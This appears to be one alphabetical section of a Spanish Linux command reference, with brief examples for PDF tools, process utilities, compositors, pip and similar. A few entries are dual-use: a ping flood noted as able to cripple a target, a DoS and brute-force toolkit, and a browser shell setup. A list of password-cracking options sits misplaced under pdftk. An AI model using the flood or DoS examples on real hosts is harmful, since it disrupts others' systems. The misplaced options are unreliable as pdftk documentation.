$ pdfcrop --margins '5 10 5 10' --clip entrada.pdf salida.pdf (nuevos margenes)


pdfdetach
Averigua si el pdf tiene archivos embebidos.
$ pdfdetach -list archivo.pdf


pdfimages
[xpdf-utils]. Extraer las imágenes de un pdf
$ pdfimages fichero.pdf fichero
$ pdfimages -j fichero.pdf fichero (guardarlas en formato jpeg)


pdfinfo
Muestra información del pdf.
$ pdfinfo archivo.pdf


pdfjoin
[pdfjam]. Unir varios pdf con el mismo formato de página en uno
$ pdfjoin --fitpaper true 1.pdf 2.pdf --outfile 12.pdf


pdflatex
Covertir archivos tex a pdf.
$ pdflatex texto.tex


pdfnup
[pdfjam]. Compactar varias páginas de un pdf en una y viceversa.
$ pdfnup --nup 2×4 archivo.pdf (8 páginas)
$ pdfnup --nup 2x1 --outfile output.pdf input.pdf (dos pàgines en una)
$ pdfnup --nup 2x2 --outfile output.pdf input.pdf  (4 páginas)


pdfopen
abrir un archivo pdf.
$ pdfopen -viewer evince archivo.pdf (con evince)
$ pdfopen -viewer evince -p 5 archivo.pdf (abrirlo por la página 5 con evince)


pdfresurrect
herramienta para la extracción/limpieza de metadatos de documentos pdf.
$ pdfresurrect -i archivo.pdf   (Información del creador del pdf)
$ pdfresurrect -w archivo.pdf  (Escribe las versiones y resumen del pdf al disco)
$ pdfresurrect -q archivo.pdf   (Muestra el número de versiones del pdf)
$ pdfresurrect -s  archivo.pdf  (Limpia todos los datos del pdf)


pdfseparate
Separa cada página de un pdf en un pdf.
$ pdfseparate sample.pdf sample-%d.pdf (si sample.pdf tiene 3 páginas crea sample-1.pdf, sample-2.pdf, sample-3.pdf)


pdfsig
Verifica las firmas digitales, caso de tenerlas, en un documento PDF y muestra la identidad de cada firmante y la hora y fecha de la firma. La validación del certificado del firmante usa los certificados confiables almacenados en la base de datos de firefox y en el archivo /etc/pki/nssdb.
	$ pdfsig archivo.pdf
	File 'archivo.pdf' does not contain any signatures


pdftk
Manipulación de pdfs
$ pdftk 1.pdf 2.pdf 3.pdf cat output 123.pdf (Unir PDFs y crear un pdf nuevo)
$ pdftk A=1.pdf B=2.pdf cat A B output 12.pdf (lo mismo utilitzando etiquetas)
$ pdftk *.pdf cat output todos.pdf (o utilitzando comodines)
$ pdftk A=one.pdf B=two.pdf cat A1-7 B1-5 A8 output combined.pdf (Separar páginas seleccionadas de distintos PDFs y crear uno nuevo)
$ pdftk revista.pdf cat 37-39 output 37_39.pdf (Separar páginas de un pdf)
$ pdftk revista.pdf cat 4 output 4.pdf (separar la 4 pagina)
$ pdftk texto.pdf output texto.128.pdf owner_pw foopass (Encriptar un PDF restringiendo todos los permisos)
$ pdftk mydoc.pdf output mydoc.128.pdf owner_pw foo user_pw baz (Lo mismo pero con contraseña para abrir el PDF)
$ pdftk mydoc.pdf output mydoc.128.pdf owner_pw foo user_pw baz allow printing (Lo mismo con permiso para imprimir una vez abierto)
$ pdftk secured.pdf input_pw foopass output unsecured.pdf (Desencriptar pdf)
$ pdftk A=secured.pdf mydoc.pdf input_pw A=foopass cat output combined.pdf (Unir dos PDFs uno de ellos encriptado. La salida no queda encriptada))
$ pdftk mydoc.pdf output mydoc.clear.pdf uncompress (Descomprimir cadenas de paginas PDF para editar el codigo PDF en un editor de texto)
$ pdftk broken.pdf output fixed.pdf (Reparar una tabla XREF de PDF y las longitudes de cadena, cuando es posible))
$ pdftk archivo.pdf output comprimido.pdf compress (Comprimir pdf)
$ pdftk archivo.pdf output descomprimido.pdf uncompress (Descomprimir pdf)
$ pdftk input.pdf cat 1-endE output output.pdf (rotar 90 grados el pdf)
$ pdftk archivo.pdf dump_data_fields (obtener campos de cualquier formulario pdf)
$ pdftk archivo.pdf dump_data_fields output campos.lst (Lo mismo derivado a un archivo)
$ pdftk archivo.pdf burst (Generar un pdf de cada página)
Opciones:
	-B: Realizar evaluación comparativa y salir
	-C [CADENA]: Utiliza los caracteres indicados para la busqueda de la contraseña
	-m [numero]: Se buscará hasta llegar a la longitud de caracteres de “numero”
	-n [numero]: Se empezará a probar contraseñas de “numero” caracteres
	-l [FILE]: Continuará desde el punto guardado en el archivo FILE.
	-q: Ejecutar silenciosamente
	-s: Realiza el crack permutando contraseñas
	-u: Trabajar con el “userpassword”


pdftocairo
Convierte spáginas de un pdf a cualquiera de los siguientes formatos de imagen: PNG, JPEG, TIFF, PDF, PS, EPS, SVG y Windows Printer
$ pdftocairo -f 1 -l 3 -r 200 -png archivo.pdf (creará 3 .png de la primera página [-f 1]  a la tercera [-l 3] a 200 de resolución [por defecto 150] del archivo.pdf)


pdftohtml
Pasar un pdf a html. Preferible lanzar en una carpeta sin contenido ya que, dependiendo de la medida del pdf, produce varios archivos.
$ pdftohtml -i -stdout archivo.pdf | w3m -T text/html (leerlo por consola con w3m sin mostrar imagenes [-i])
$ pdftohtml -s archivo.pdf (Crea un html de una sola página)
$ pdftohtml -c archivo.pdf (Crea una página cada una del pdf)


pdftops
Pasar un pdf a ps. Útil para imprimir archivos pdf protegidos contra escritura.
$ pdftops archivo.pdf  (El archivo.ps resultante puede ser impreso aunque el archivo.pdf estuviera protegido)


pdftotext
[xpdf-utils]. Maniupulación de pdfs.
$ pdftotext -listenc (Lista las codificaciones soportadas)
$ pdftotext -layout texto.pdf texto.txt
$ pdftotext -htmlmeta texto.pdf text.html
$ pdftotext -enc UTF-8 -htmlmeta texto.pdf texto.html (Especificando una codificación)


pdfunite
Unir varios pdf en un sólo documento.
$ pdfunite 1.pdf 2.pdf 1+2.pdf


pebrot
Cliente msn en ncurses. Ingresar usuario y contraseña en /home/USUARIO/.pebrot/pebrotrc
Algunos atajos:
	h (lista de comandos)
	l (contactos conectados y enumerados)
	numero  (abre conversación con el número del contacto)
	i numero (invita al usuario del numero indicado a la conversación)
	e (limpia la pantalla)
	c (cierra la conversación activa)
	a usuario (añade un usuario a contactos)
	b usuario (bloquea a usuario)
	f archivo (enviar archivo)
	fa (aceptar archivo que nos envian)
	fr (rechazar recepción de archivo)


pee
[moreutils]. Parecido al comando tee [ver] ejecutando cada uno de los comandos
$ pee ls pwd "ip a"


pentbox
Descarga de <http://www.pentbox.net/download-pentbox/> . Herramientas de penetración [verificar fortaleza de contraseñas cifradas en MD5, SHA1, SHA256, SHA512, generador de DoS i DDoS, generador de contraseñas seguras, honeypots, escaneo de puertos, ataque de fuerza bruta contra servidores HTTP, geolocalitzación de direcciones MAC...]
$ pentbox


perftest
Es una colección de pruebas destinadas a usarse como microevaluación de rendimiento como medir la latencia y el ancho de banda de las estructuras Infiniband. Incluye varios ejecutables: ib_atomic_bw, ib_atomic_lat, ib_read_bw, ib_read_lat, ib_send_bw, ib_send_lat, ib_write_bw, ib_write_lat, raw_ethernet_burst_lat, raw_ethernet_bw, raw_ethernet_fs_rate, raw_ethernet_lat, run_perftest_loopback y run_perftest_multi_devices


periodic
Ejecutar un programa con un intervalo determinado. Descargar de https://github.com/josch/periodic
$ periodic -n 2 -c 3 -s -f echo "linux es genial" (cada 2 segundos, con 3 intervalos o sea imprimirá 4 veces el texto y sin imprimir el contador)
Otras opciones:
-d (contar hacia abajo, predeterminado hacia arriba)
-b BEGIN (iniciar el conteo en BEGIN, predeterminado 0)


pev
Herramienta para obtener información de los ejecutables PE32/PE32+ (EXE, DLL, OCX etc) como cabeceras, secciones, recursos y más.
$ pev -p putty..exe (ver solo la versión de putty.exe)
$ pev -dc cards.dll (mostrar los encabezados de archivo DOS y COFF de cards.dll)
$ pev svchost.exe (mostrar toda la información de svchost.exe)


peyote
Reproductor de música tipo moc. <http://peyote.sourceforge.net/>
$ peyote directory /home/USER/musica
algunas teclas de control:
	n (Siguiente canción)
	s (reproducir el directorio de forma aleatoria)
	r (Repetir)
	espacio (Pausa)
	q (Salvar la sesión y salir)
	tab (Moverse entre los paneles)


pg
Muestra un texto tabulado a pantalla completa de la terminal. Con la tecla intro carga nuevo párrafo.
$ pg archivo


pgrep
Examina los procesos en ejecución y enumera los identificadores de cada proceso.
$ pgrep emacs
$ pgrep httpd
$ pgrep -l -G group (del grupo especificado)
$ pgrep -l -u user (del usuario especificado)


pgtop
Monitorear la base de datos de postgres.
# pgtop -h localhost -s 10 -p 6543 -d BASE_DE_DATOS -u USER -p PASS (del host localhost, actualización cada 10 segundos [por defecto 5], puerto 6543 [por defecto 3306] de la base de datos especificada, usuario USER y la contraseña)


phockup
Organizar carpetas de fotos por año, mes y dia. Descarga: <https://github.com/ivandokov/phockup>
$ phockup -d YYYY/M  carpeta_fotos carpeta_ordenada (por año y mes por nombre en inglés)
$ phockup -l -d YYYY/MM  carpeta_fotos carpeta_ordenada (creando un link de las fotos en carpeta_ordenada hacia carpeta_fotos para no tenerlas duplicadas)
Formatos soportados:
    YYYY - 2017, 2018 ...
    YY   - 17, 18 ...
    MM   - 01, 02, ...
    M    - July, August, September ...
    m    - Jul, Aug, Sept ...
    DD   - 20, 21, ...


phoronix
[phoronix-test-suite]. suite de pruebas para medir el rendimiento de un sistema o componente del mismo [benchmarking]. Cuenta con un repositorio online con gran cantidad de pruebas y se ejecutan a través de un archivo de configuración XML.
# phoronix-test-suite list-available-tests (Lista los test disponibles y una pequeña descripción)
# phoronix-test-suite list-available-suites (Lista las suites disponibles y una pequeña descripción)
# phoronix-test-suite install pts/encode-flac (Instalar con sus dependencias un test o suite. En este caso el test pts/encode-flac)
# phoronix-test-suite benchmark pts/encode-flac (Realizar la prueba que mide el tiempo que el pc tarda en convertir un wav a flac)
# phoronix-test-suite system-information (Muestra la configuración completa)
# phoronix-test-suite list-saved-results (Ver los resultados guardados)
# phoronix-test-suite result-file-to-pdf archivo.pdf (Exportar resultados a un archivo pdf)
# phoronix-test-suite result-file-to-cvs archivo.cvs (Exportar los resultados a un archivo cvs)
# phoronix-test-suite result-file-to-text archivo.txt (Exportar los resultados a un archivo txt)
# phoronix-test-suite merge-results resultado1 resultado2 resultado3 (Realizar tablas comparativas con los resultados)
Nota.- Al realizar un test se nos preguntará si deseamos guardar la prueba (Los resultados se guardan e $HOME/.phoronix-test-suite/test-results), luego el test comenzará y una vez terminado se nos preguntará si queremos ver los resultados en el navegador.


photon
Generar una galería web.
$ photon directorio_con_las_imagenes  (Creará una nueva carpeta con todos los html)
$ photon -o /var/www/ /home/usuario/fotos (A partir de la carpeta fotos, lo creará en el directorio web)


photorec
[testdisk]. Recuperar datos de discos, tarjetas, cds deteriorados... Precisa pantalla maximizada.
# photorec


php
Lenguaje de programación diseñado originalmente para la creación de páginas web.
$ php -v (Conocer la versión)
$ php -m (Muestra módulos instalados)
$ php -i (Información general de php)
$ php -s archivo.php > archivo.html (Crea un archivo html de un php)
$ php -l script.php (Comprobar la sintaxis de un script.php)
$ php --ini (Informa donde se encuentran los archivos .ini de php)
$ php -S localhost:9000 -t /ruta/al/proyecto (Crear un servidor php ligero)
1.-
Configuración de php de forma segura (php.ini)
	# nano /etc/php/7.0/cli/php.ini
	expose_php Off (Ocultar la versión de php)
	session.use_trans_sid = Off (Que las URL no muestren los ID de sesiones)
	allow_url_fopen = Off (Desactivar acceso a URL remotas en funciones de manejo de ficheros)
	display_errors = Off (Evitar que los errores se muestren por pantalla)
Nota.- Para conocer la situación de php.ini, porque puede variar segun la versión de php y distro:
$ php -i | grep "Loaded Configuration File"
2.-
Arreglar el error: PHP Deprecated:  Comments starting with '#' are deprecated in /etc/php5/cli/conf.d/ming.ini on line 1 in Unknown on line 0
	# nano /etc/php5/cli/conf.d/ming.ini
	Y cambiar el “#” de los comentarios por un “;”


phpshell
[apache2 php5 libapache2-mod-auth-mysql php5-mysql]. Script en php que proporciona una terminal en el navegador. Descarga de http://sourceforge.net/projects/phpshell/?source=dlp. Para la versión 2.4:
$ wget http://sourceforge.net/projects/phpshell/files/phpshell/2.4/phpshell-2.4.zip
$ unzip phpshell-2.4.zip
Mover la carpeta al directorio web y darle un nombre:
$ mv phpshell-2.4/ /var/www/shell
Renombrar:
$ cd /var/www/shell
$ mv phpshell.php index.php
Entrar en el navegador y acceder en la dirección: http://localhost/shell/pwhash.php para entrar un nombre de usuario y una contraseña. Completado el registro, pulsar "update". Copiar el hash  que muestra y pegarlo en el archivo de configuración:
$ nano /var/www/shell/config.php
Pegar el hash en el apartado [users]
	templix = "sha1:2ud9a08b:27w6806b770f9716a9ec3f9b72a402e3b0a8b6e5"
Entrar en phpshell colocando en el navegador: http://localhost/shell


pi
Calcula la cantidad de decimales de pi que se le indique.
$ pi 100
$ pi 1000


pico
Editor de texto al estilo de Pine Composer.
$ pico fichero.txt
Algunas teclas para moverse por el fichero:
    ^p o <flecha arriba> ir a la linea anterior
    ^n o <flecha abajo>  ir a la linea siguiente
    ^a                   ir al principio de la línea.
    ^e                   ir al final de la línea.
    ^v                   adelanta una página
    ^y                   página anterior
    ^k                   elimina la línea del cursor.
    ^u                   restaura líneas eliminadas y las coloca en la posición del cursor.
    ^w                   busca texto
    ^x                   guardar y salir


picom
Es un compositor en Xorg más avanzado que picon [ver] y con más opciones de personalización, soporte para efectos avanzados y mayor compatibilidad con entornos modernos y que también aplica efectos gráficos, sombras, transparencias, difumninados y animaciones.
$ picom & (se ejecuta con sus valores predeterminados y aplica efectos básicos como sombras y transparencias)
$ picom --active-opacity=1.0 --inactive-opacity=0.8 & (con las ventanas activas totalmente opacas y las inactivas serán un 80% opacas)
$ picom --shadow=true --shadow-radius=15 --shadow-opacity=0.75 & (activa las sombras, establece su radio y ajusta su opacidad)
$ picom --blur-method=dual_kawase --blur-strength=7 & (con método avanzado de difuminado y ajuste de su intensidad)
$ picom --shadow-exclude "class_g = 'Conky'" --opacity-rule "90:class_g = 'Firefox'" & (no aplica sombras a ventanas con la clase "Conky" y las de "Firefox" a un 90% de opacidad)
$ picom --log-level=debug --log-file=picom.log  (diagnosticar problemas y guarda un registro detallado en el archivo picom.log)
Crear un archivo de configuración detallado. Sirva de ejemplo:
$ nano  ~/.config/picom.conf
  # General
  backend = "glx";
  vsync = true;
  #
  # Sombras
  shadow = true;
  shadow-radius = 12;
  shadow-opacity = 0.8;
  #
  # Transparencias
  inactive-opacity = 0.85;
  active-opacity = 1.0;
  #
  # Difuminado
  blur-method = "dual_kawase";
  blur-strength = 5;
  #
  # Exclusiones
  shadow-exclude = [
      "class_g = 'Conky'",
      "_GTK_FRAME_EXTENTS@:c"
  ];
$ picom --config ~/.config/picom.conf & (iniciar la aplicación con este archivo)
$ picom --experimental-backends --no-fading-openclose --log-level=info (activa nuevas características experimentales, desactiva el desvanecimiento al abrir/cerrar ventanas y muestra más información para depuración)
Para habilitar o deshabilitar ciertos efectos mientras picom está en ejecución se usa señales de Unix:
$ pkill -USR1 picom (desactivar sombras)
$ pkill -USR2 picom (rehabilitar efectos)
$ pkill picom (detener la aplicación)


picon
compositor independiente para el sistema de ventanas Xorg, que gestiona y aplica efectos gráficos, como sombras y  transparencias a las ventanas y su entorno. Los compositores como picon son útiles para mejorar la apariencia visual y la experiencia del escritorio en sistemas basados en Xorg. La principal diferencia entre picon y picom [ver] radica en que picon es una implementación más minimalista y básica que picom, que es un compositor más avanzado.
$ picon & (iniciar el compositor. El símbolo & asegura que picon se ejecute en segundo plano y habilitará efectos básicos como sombras y transparencias según su configuración)
$ picon --inactive-opacity=0.85 --active-opacity=1.0 & (las ventanas inactivas serán un 85% opacas y las activas serán completamente opacas)
$ picon --shadow=true --shadow-radius=12 --shadow-opacity=0.7 & (activa las sombras, ajusta su tamaño y define su opcacidad)
$ picon --shadow-exclude "class_g = 'Notification'" & (excluye ventanas con la clase "Notification" útil para sistemas de notificaciones como Dunst)
Personalizar la aplicación utilizando el archivo de configuración. Un ejemplo podría ser:
$ nano ~/.config/picon/picon.conf
  # Transparencias
  inactive-opacity = 0.85;
  active-opacity = 1.0;
  #
  # Sombras
  shadow = true;
  shadow-radius = 10;
  shadow-opacity = 0.7;
  #
  # Exclusiones
  shadow-exclude = [
      "class_g = 'Notification'",
      "class_g = 'Conky'"
  ];
$ picon --config ~/.config/picon/picon.conf & (iniciar picon indicando este archivo de configuración)
$ picon --log-level=debug (ejecutarlo con un mayor nivel de detalle)


pidof
muestra el Pid del programa si está activo.


pidstat
[sysstat]. Muestra información relacionada con los procesos del sistema.
$ pidstat  (informa del uso de la CPU)
$ pidstat -u  (lo mismo)
$ pidstat -d  (Muestra la tasa de lectura/escritura a los medios fisicos)
$ pidstat -p 1234  (Especifica que solo deseas analizar el proceso 1234)
$ pidstat -C comando  (Similar a -p pero indicando el nombre del proceso)
$ pidstat -r  (Muestra el uso de memoria de los procesos y errores de 	paginación en la memoria de los procesos -page faults-).
$ pidstat -I  (En sistemas multicore, indica la CPU en la que se ejecuta el 	comando)
$ pidstat -d 5 2 (“5” es el intervalo de tiempo y “2” el número de veces que ejecutara el comando. Cuando haya llegado al número de 	ejecuciones, pidstat se parará y mostrará una media con los valores obtenidos)
$ pidstat -d 5  (omitiendo el numero de veces a ejecutar para producir un bucle infinito. Parar con ^C)


pig
[bsd-games]. Reformatear palabras o frases entradas en el prompt a un lenguaje macarrónico.
$ pig (entra en el prompt. Entrar cualquier frase pulsar enter y comprobar el resultado)


pigz
Compresión de ficheros. Permite lanzar varias instancias en paralelo para un único proceso de compresión. Sobrreescribe el fichero dándole extensión gz a menos que lo usemos con el parámetro -k. Pigz es casi lo mismo que gzip solo que aprovecha los múltiples cores a diferencia de gzip que solo usa un core. Al comprimir sólo ficheros, si queremos comprimir un directorio, primero se ha de empaquetar con tar (ver). Descarga y compilación:
	wget http://zlib.net/pigz/pigz-2.3.1.tar.gz
	$ tar -xzvf pigz-2.3.1.tar.gz
	$ make
Nota.- Si no se desea arrancar la aplicación con ./pigz crear un enlace directo en el path [ln -s pigz-2.3.1/pigz /usr/bin/]
$ pigz -p 4 fichero (Especificando número de procesos a levantar. Por defecto utiliza todos los cores i procesadores de la máquina)
$ pigz -k fichero (Sin sobreescrir el fichero)
$ pigz -d fichero.gz (Descomprimir el fichero creado)
$ pigz -r carpeta (Comprimir todos los archivos de la carpeta. No la carpeta)
Algunas opciones:
--fast (Nivel mínimo de compresión)
--best (Nivel máximo de compresión)


pilfile
Identificar archivos de imagenes.
$ pilfile -l (listado de archivos soportados)
$ pilfile -i grafic.png


pinentry-tty
Programa que permite la entrada segura de PIN o frases de contraseña.
# pinentry-tty (uso básico)
# gpg --passphrase-fd 0 | pinentry-tty (con gpg)
# ssh-keygen -t rsa -b 4096 -C "el_email@example.com" -f ~/.ssh/id_rsa (con ssh)


pinfo
Comando para mostrar información de los programas del proyecto GNU parecido a "info" [ver] pero más configurable.
$ pinfo ip
Ejemplo de archivo de configuración <http://pinfo.sourceforge.net/doc/pinfo.html#SEC8>
$ nano .pinforc
	# Here are some colour setting.
	# Whitespace between the entries is optional.
	#
	COL_NORMAL        =COLOR_WHITE,    COLOR_BLACK, NO_BOLD, NO_BLINK
	COL_MENUSELECTED  =COLOR_RED,      COLOR_BLACK, BOLD,    NO_BLINK
	COL_MENU          =COLOR_BLUE,     COLOR_BLACK, BOLD,    NO_BLINK
	COL_NOTESELECTED  =COLOR_RED,      COLOR_BLACK, BOLD,    NO_BLINK
	COL_NOTE          =COLOR_GREEN,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_TOPLINE       =COLOR_YELLOW,   COLOR_BLUE,  BOLD,    NO_BLINK
	COL_BOTTOMLINE    =COLOR_YELLOW,   COLOR_BLUE,  BOLD,    NO_BLINK
	COL_MANUALBOLD    =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_MANUALITALIC  =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	COL_URL           =COLOR_MAGENTA,  COLOR_BLACK, BOLD,    NO_BLINK
	COL_URLSELECTED   =COLOR_RED,      COLOR_BLACK, NO_BOLD, NO_BLINK
	COL_INFOHIGHLIGHT =COLOR_WHITE,    COLOR_BLACK, BOLD,    NO_BLINK
	#
	# Here are some keybindings as well...
	#
	KEY_TOTALSEARCH_1    ='s'
	KEY_TOTALSEARCH_2    ='S'
	KEY_SEARCH_1         ='/'
	KEY_SEARCH_2         ='.'
	KEY_GOTO_1           ='g'
	KEY_GOTO_2           ='m'
	KEY_HOME_1           ='h'
	KEY_HOME_2           ='H'
	KEY_PREVNODE_1       ='p'
	KEY_PREVNODE_2       ='P'
	KEY_NEXTNODE_1       ='n'
	KEY_NEXTNODE_2       ='N'
	KEY_UP_1             =KEY_UP
	KEY_UP_2             ='u'
	KEY_END_1            =KEY_END
	KEY_END_2            ='e'
	KEY_PGDN_1           =KEY_NPAGE
	KEY_PGDN_2           =' '
	KEY_PGDN_AUTO_1      =0
	KEY_PGDN_AUTO_2      =' '
	KEY_PGUP_1           =KEY_PPAGE
	KEY_PGUP_2           ='b'
	KEY_PGUP_AUTO_1      =0
	KEY_PGUP_AUTO_2      ='b'
	KEY_DOWN_1           =KEY_DOWN
	KEY_DOWN_2           ='d'
	KEY_TOP_1            =KEY_HOME
	KEY_TOP_2            ='t'
	KEY_BACK_1           =KEY_LEFT
	KEY_BACK_2           ='l'
	KEY_FOLLOWLINK_1     =KEY_RIGHT
	KEY_FOLLOWLINK_2     ='\n'
	# 12 is a code for ctrl+l
	KEY_REFRESH_1        =KEY_CTRL('l')
	KEY_REFRESH_2        ='~'
	KEY_SHELLFEED_1      ='!'
	KEY_SHELLFEED_2      ='1'
	KEY_QUIT_1           ='q'
	KEY_QUIT_2           ='Q'
	KEY_DIRPAGE_1        ='d'
	KEY_DIRPAGE_2        ='D'
	KEY_GOLINE_1         ='l'
	KEY_GOLINE_2         =0
	KEY_PRINT_1          =']'
	KEY_PRINT_2          =0
	KEY_SEARCH_AGAIN_1   ='f'
	KEY_SEARCH_AGAIN_2   =0
	#
	# Some options, explained in the man page
	#
	MANUAL=false
	CUT-MAN-HEADERS=true
	CUT-EMPTY-MAN-LINES=true
	RAW-FILENAME=false
	APROPOS=false
	DONT-HANDLE-WITHOUT-TAG-TABLE=false
	LONG-MANUAL-LINKS=false
	FILTER-0xB7=true
	QUIT-CONFIRMATION=false
	QUIT-CONFIRM-DEFAULT=no
	CLEAR-SCREEN-AT-EXIT=true
	STDERR-REDIRECTION="2> /dev/null"
	HTTPVIEWER=lynx
	FTPVIEWER=lynx
	MAILEDITOR=pine
	MANLINKS=1:8:2:3:4:5:6:7:9:n:p:o:3X11:3Xt
	INFOPATH=/usr/info:/usr/share/info:/usr/local/info
	HIGHLIGHTREGEXP=bash.*has
	SAFE-USER=nobody
	SAFE-GROUP=nobody


ping
Para saber si existe conexión con un host
$ ping ip (Uso básico)
$ ping -c 2 google.com (mandar solo dos paquetes)
$ ping -n google.com  (Muestra las direcciones ip por su número y no por su nombre de host)
$ ping -i 2 google.es (Establece un intérvalo de 2 segundos entre cada transmisión. Por defecto 1")
$ ping -w 3 google.es (Salir de ping a los 3 segundos)
# ping -f google.es (Envio masivo de pings. Por cada ECHO_REQUEST enviado se escribe un punto [.] y por cada ECO_REPLY recibido un baskspace [retroceso]. Puede colgar la red o la máquina objetivo mientras dura el ping)
# ping -s 200 google.es (Especificando número de bytes de datos que se envian. Por defecto 56. Combinado con el parámetro -f puede ser letal para la máquina objetivo)


pinky
Información sobre los usuarios del sistema.
$ pinky -l usuario
$ pinky -b usuario root (shells abiertas por los usuarios especificados)


pip
[python3-pip python-dev build-essential]. Herramienta para instalar, actualizar, eliminar y buscar paquetes de Python.
# pip install paquete
# pip uninstall paquete (desinstala el paquete)
# pip search paquete (Busca información sobre el paquete)
# pip freeze (Listar la totalidad de paquetes python instalados y su versión)
# pip list --outdated (listar paquetes abosoletos)
# pip show paquete (información de un paquete)
# pip check (verificar paquetes instalados si están bien instalados y no tienen problemas de dependencias)
# pip install --upgrade paquete (actualizar un paquete a su última versión)
# pip freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U (actualizar todos los paquetes)
# pip cache dir (Ver la ubicación del directorio que almacena copias en forma de cache de los paquetes que se descargan)


pipes
[pipes.sh]. Muestra tuberías que se dibujan en la terminal. Hay varios tipos de tuberías disponibles.
$ pipes -t 5 -p 10 (10 tuberias, por defecto 1 y con el modelo de caracteres 7)


pipx
[python3-venv]. Gestor de paquete python.
$ pipx ensurepath (añadir el directorio que usa la aplicación [~/.local/bin] al $PATH)
$ pipx install shell-genie (instalar un paquete)
$ pipx list (lista los paquetes instalados en /home/USER/.local/bin)
$ pipx list --short (solo listando paquetes y versión)
$ pipx list --json > pipx.json (crae un archivo de los paquetes instalados)
$ pipx install-all pipx.json (instalar los paquetes del listado anterior)
$ pipx environment (variables de entrono)
$ pipx completions (muestra lo que tiene que agregarse para autocompletado a .bashrc en el caso de bash y en otras shells)
$ pipx run cowsay check . (chequear como se comportaria un comando [cowsay] sin instalarlo)
$ pipx upgrade shell-genie (actualizar una aplicación)
$ pipx upgrade-all (actualizar todas las aplicaciones instaladas)
$ pipx uninstall shell-genie (desinstalar una aplicación)
$ pipx uninstall-all (desinstalar todas las aplicaciones instaladas)


pitidos
[del pc]. Señales de alerta sonora cuando algo falla.
Sin pitidos.-  Sin suministro eléctrico
Pitido constante ininterrumpido.-  Falla en el suministro eléctrico
Pitidos cortos y constantes.- Placa base defectuosa.
1 pitido corto .- Lo normal.
1 pitido largo.- Fallo en memoria RAM.
1 pitido largo + 1 corto.- Fallo general en la placa base
1 pitido largo + 2 cortos.- Problema con la tarjeta de vídeo
1 pitido largo + 3 cortos.- Monitor no conectado a la tarjeta gráfica
1 pitido largo + varios cortos.- Problema con la tarjeta de vídeo
2 pitidos largos + uno corto.- Error en la sincronización de imágenes


pkaction
[policykit o polkit según distros)]. Herramienta para manejar politicas que permitan a los procesos sin privilegios "hablar" con procesos privilegiados.
$ pkaction (Muestra todos los procesos a los que afecta esta politica)
# pkaction | grep power (Las que hacen referencia al proceso "power")


pkcon
[packagekit]. Gestión de paquetes para varios sistemas (apt-get, rpm...). Permite realizar tareas simples de administración de software, por ejemplo, actualizando la caché, instalando y eliminando paquetes de software o buscando codecs multimedia. Su interfaz gráfica, packagekit,  no pretende reemplazar herramientas avanzadas como Synaptic.
# pkcon update (equivalente al apt update)
# pkcon install paquete (instalar "paquete")
# pkcon remove paquete (eliminar "paquete")
# pkcon upgrade-system complete (actualizar toda la distro)
# pkcon get-updates (muestra los paquetes actualizables)
# pkcon get-packages (listar todos los paquetes disponibles e instalables)
# pkcon repo-list (listar todos los repos de lso paquetes instalados)
# pkcon repair (reparar la base de datos de los repositorios)


pkexec
Herramienta que forma parte de PolicyKit y permite que un usuario autorizado pueda ejecutar un único programa como si fuera otro usuario. Es el substituto de gksudo.
$ pkexec --user otro_usuario synaptic


pkill
matar procesos.
# pkill -x scribus (equivalente a: # killall scribus)
$ pkill -9 -t pts/3 (Mata procesos no basados en el PID. La terminal 3 en este caso)
# pkill -9 -t tty1 (Mata la terminal tty1)
# pkill -u `whoami` (Mata todos los procesos del usuario)
# pkill -KILL -u usuario (lo mismo)


pktstat
Monitor de tráfico de red
# pktstat -i eth0 -n -w 3 (especificando red, sin resolver las ips y refresco cada 3 segundos [por defecto cada 5])


planets
Simulador grabitacional del movimiento de los astros.
$ planets
Algunas teclas de control:
	j (Crea planetas orbitales aleatorios)
	r (Crea planetas aleatorios)
	c (Centra el sistema planetario)
	t (Muestra las trayectorias)
	e (Resetear el universo)
	s (Guardar)
	l (Cargar un universo)
	Flechas (Desplazan el conjunto)


play
[sox]. Reproductor
$ play archivo.wav


plowshare
herramienta que permite subir y descargar archivos alojados en megaupload, rapidshare... ]http://plowshare.googlecode.com/files/plowshare-SVN-r1575-snapshot.tar.gz]
$ plowdown url (Descargar un archivo)
$ plowdown lista_de_links.txt (descarga una lista de links)
$ plowdown -a usuario:contraseña url (caso de precisar usuario y contraseña)


pm
[pm-utils]. Colección de comandos que permiten suspender, hibernar o pasar a modo de bajo consumo.
# pm-is-supported (determinar qué modos de ahorro de energía son soportado por el sistema)
# pm-powersave (activa o desactiva el modo de ahorro de energía, pasándolo a "L")
# pm-suspend (suspende las operaciones en memoria y coloca el sistema al mínimo consumo posible)
# pm-hibernate (hiberna el sistema bajando todos los datos de memoria al disco rígido)
# pm-suspend-hybrid (Híbrido entre hibernación y suspensión. En caso de agotarse la batería, se mantiene en estado de hibernación, sin perder datos)
Notas:
	H (High) máxima utilización del sistema de enfriamiento.
	A (Auto) sistema de regulación automática de temperatura.
	L (Low) mínimo uso del sistema de enfriamiento. Cuando supera cierto límite, pasa a modo automático.
1.-
opciones que permite un ordenador.
# cat /sys/power/state
Si en la salida aparece "mem" significa que podemos suspender el ordenador. Si aparece "disk" significa que podemos hibernar.


pmacct
Herramienta diseñada para recopilar información de tráfico [bytes y número de paquetes]. Incluye las aplicaciones: nfacctd, pmacctd, pmbgpd, pmbmpd, pmtelemetryd, sfacctd y uacctd. El archivo de configuración esta en /etc/pmacct/pmacctd.conf.
# pmacctd (activar el demonio)
# pmacct -a (muestra todos los campos de la tabla)
# pmacct -s (mostrar todas las estadísticas)
# pmacct -t (mostrar estado de la tabla de memoria)
# pmacct -e (limpiar la tabla de estadísticas)


pmap
Informa sobre el rendimiento de la memoria del sistema, tanto en general como la memoria que consume un proceso concreto.
$ pmap -d PID (consumo de memoria de las librerías, comandos y archivos que está empleando el proceso indicado)
$ pmap -x PID (Muestra información adicional y la memoria consumida por todos los archivo que corren en determinado PID
$ pmap -p PID (Mostrar ruta en el mapeo)


pmdk-tools
Paquete que proporciona al usuario un conjunto de utilidades para el análisis y manipulación fuera de línea de grupos creados por bibliotecas pmem. Incluye las aplicaciones daxio y pmempool.
# daxio --zero /dev/dax (Poner a cero el dispositivo de salida)
# daxio --input=/dev/zero --output=/dev/dax --skip=4096 (número de bytes que se deben omitir en la entrada antes de realizar una lectura)
